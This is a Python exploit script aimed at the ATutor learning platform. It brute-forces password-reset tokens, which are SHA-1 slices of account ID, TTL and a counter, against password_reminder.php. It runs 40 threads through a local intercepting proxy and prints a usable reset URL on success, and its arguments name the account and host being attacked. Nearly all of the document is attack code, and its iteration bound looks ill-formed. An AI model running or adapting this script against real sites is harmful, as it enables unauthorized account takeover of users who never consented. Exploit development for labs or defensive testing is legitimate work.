#!/usr/bin/python3

import hashlib
import argparse
import string
import itertools
import re
import sys
import requests
import queue
import threading

proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

q = queue.Queue(10)
exitFlag = 0


def worker():
    global exitFlag
    while True:
        item = q.get()
        if item is None:
            break
        if exitFlag == 1:
            break
        host = item["host"]
        account_id = item["acc_id"]
        ttl = item["ttl"]
        x = item["x"]
        ptr = str(int(account_id) + int(ttl) + int(x))
        hash = hashlib.sha1(ptr.encode()).hexdigest()[5:20]
        params = {
            "id": account_id,
            "g": ttl,
            "h": hash
        }
        change_request = requests.get(
            f"{host}/ATutor/password_reminder.php", params=params, proxies=proxies)
        if "The link is either invalid or expired." not in change_request.text:
            print(f"[+] found hash {hash}")
            url = f"{host}/ATutor/password_reminder.php?id={account_id}&g={ttl}&h={hash}"
            print(f"[+] Use the following url {url}")
            exitFlag = 1
        q.task_done()


def start_workers(worker_pool=1000):
    threads = []
    for i in range(worker_pool):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    return threads


def stop_workers(threads):
    # stop workers
    for i in threads:
        q.put(None)
    for t in threads:
        t.join()


def create_queue(task_items):
    for item in task_items:
        q.put(item)


def produce_list():
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument(
        '-ttl', help="the hash ttl", required=True)
    parser.add_argument(
        '-account_id', help="The Account ID being attacked", required=True)
    parser.add_argument(
        '-max_prefix_length', help="Max length of the email name", required=True)
    parser.add_argument(
        '-host', help="The host to attack", required=True)
    args = parser.parse_args()

    ttl = int(args.ttl)
    account_id = int(args.account_id)
    max_prefix_length = int(args.max_prefix_length)
    host = args.host
    task_items = []
    

    workers = start_workers(worker_pool=40)
    for x in range(0, max_prefix_length ** 10):
        task_items.append({
            "host": host,
            "acc_id": account_id,
            "ttl": ttl,
            "x": x,
            "workers": workers
        })
    create_queue(task_items)

    # Blocks until all tasks are complete
    q.join()

    stop_workers(workers)


if __name__ == "__main__":
    produce_list()
